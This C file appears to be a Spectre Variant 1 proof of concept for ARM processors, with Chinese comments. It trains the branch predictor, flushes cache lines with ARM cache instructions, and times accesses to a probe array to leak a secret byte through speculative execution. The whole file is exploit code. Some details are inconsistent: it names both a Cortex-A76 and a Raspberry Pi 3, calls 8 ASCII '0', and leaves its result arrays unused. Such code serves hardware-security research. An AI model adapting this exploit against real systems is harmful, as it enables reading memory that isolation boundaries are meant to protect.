#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>


// 1. 计时器封装
static inline uint64_t get_time(void) {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000ULL + t.tv_nsec;
}


static inline void flush_memory(void *addr) {
    asm volatile(
        "dc civac, %0\n\t"
        "dsb ish\n\t"
        "isb\n\t"
        :: "r"(addr) : "memory");
}

static inline void memory_barrier(void) {
    asm volatile ("dsb ish; isb" ::: "memory");
}

#define _mStore(addr, val)                 \
asm volatile(                                      \
    "strb %w[value], [%[address]]\n\t"          \
    :                                              \
    : [address] "r" (addr), [value] "r" ((uint32_t)(val)) \
    : "memory")


#define TRAIN_TIMES         15
#define ROUNDS              1
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // 16个有效元素，后面填充0
uint8_t unused2[64];
// uint8_t array2[256 * 64]; 
uint8_t array2[256 * 64] __attribute__((aligned(4096)));;


// char *secret = "s";
// set secret value = int 8
char ch = 8;
char *secret = &ch;

uint8_t temp = 0; /* 用于防止编译器优化掉内存访问 */

// 包含漏洞的函数 (Gadget)
void victim_function(size_t x) {
    if (x < array1_size) {
        // temp &= array2[array1[x] * i];
        for(int t = 0; t < 5; t++){//1,2,3,4
            _mStore(&array2[array1[x] * t * 64], 17);
            // temp &= array2[array1[x] * t * 64];
        }
        // _mStore(&array2[array1[x] * i * 64], 1);
    }
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    int results[256]={0};
    int probe_times[256]={0};
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    // 尝试多次以消除噪声
    for (tries = 9999; tries > 0; tries--) {

        // 1. FLUSH array2 (准备 Reload)
        for (i = 0; i < 256; i++)
            flush_memory(&array2[i * 64]);

        // 2. 训练分支预测器 (Training)
        // 训练 loop 次数在 A53 上可能需要调整，通常 5-30 次
        // training_x = tries % array1_size;
        training_x = 0; // 始终训练合法索引，增加预测器的信心
        // for (j = 29; j >= 0; j--) {
         for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {

             x = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));
            // 调用受害者函数
            for (i = 0; i < 256; i++) flush_memory(&array2[i * 64]);
            flush_memory(&array1_size);
            victim_function(x);
        }

    
        int probe_index = tries % 256;// 0-255
        addr = &array2[probe_index * 64];
        // 关键计时段
        time1 = get_time();
        junk = *addr; // 访问内存
        memory_barrier(); // 确保读完了再计时
        time2 = get_time() - time1;

            // 判定 Cache Hit
        results[probe_index] += time2;
        probe_times[probe_index] += 1;
    
    }
    for(int i=0;i<256;i++){
        printf("results[%d] = %d\n", i, results[i] /= probe_times[i]); // 取平均
        // printf("results[%d] = %d, array2[%d * 64] = %d\n", i, results[i] /= probe_times[i], i, array2[i*64]); // 取平均
    }
}

int main(int argc, const char * * argv) {
    // *secret = 8; // 将 secret 设置为 8 (ASCII '0')，以便我们知道正确答案应该是 8
    printf("Spectre Variant 1 PoC for Cortex-A76\n");
    printf("Reading %d bytes:\n", (int)strlen(secret));
    printf("The secret value is set to %d\n", *secret);

     /* Default addresses to read is 40 (which is the length of the secret string) */
    // 初始化 array2
    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1; 

    // 计算 secret 相对于 array1 的偏移量
    // 假设 secret 存储在 array1 之后的某个位置
    size_t malicious_x = (size_t)(secret - (char *)array1);
    
    int len = strlen(secret);
    uint8_t value[2];
    int score[2];

    printf("Raspberry Pi 3 Spectre V1 PoC\n");
    printf("Reading %d bytes:\n", len);

    while (--len >= 0) {
        readMemoryByte(malicious_x++, value, score);
    }
    return (0);
}